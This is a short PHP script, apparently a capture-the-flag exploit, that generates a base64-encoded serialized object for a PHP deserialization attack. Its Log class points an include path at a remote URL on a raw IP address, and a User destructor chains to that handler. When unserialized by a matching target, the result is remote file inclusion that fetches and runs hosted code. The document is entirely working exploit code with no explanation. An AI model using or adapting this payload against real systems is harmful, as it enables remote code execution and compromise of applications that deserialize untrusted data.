<?php
class Log{
	private $type_log = "http://122.51.18.106/e186ce/rr.txt";
	
	public function handler($val){
		//include($this->type_log);

	}
}

class User{
	private $name;
	private $wel;

	function __construct(){
		$this->name = "admin";
		$this->wel = new Log();
	}

	function __destruct(){
		$this->wel->handler($this->name);
	}
}

$a = new User();
echo base64_encode(serialize($a));